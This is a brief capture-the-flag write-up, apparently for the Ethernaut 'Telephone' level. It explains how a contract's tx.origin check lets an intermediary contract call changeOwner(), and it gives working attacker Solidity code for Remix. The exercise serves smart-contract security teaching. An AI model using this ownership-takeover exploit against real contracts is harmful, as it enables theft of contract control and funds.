### Goals

- claim ownership of contract

### Exploit

This contract allows setting owner by `changeOwner()`, but first some check is done.

`tx.origin` is the address from which the transaction was triggered and `msg.sender` is just in the context of current call.

To win this level we must make sure they are different. We can make that by using basic smart contract.

### Code

Use Remix once again:

```code
contract TelephoneHack {
  function gimmeOwner(address telephone) external {
    telephone.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
  }
}
```

Then call `gimmeOwner()` with address of your Telephone contract.

Done!
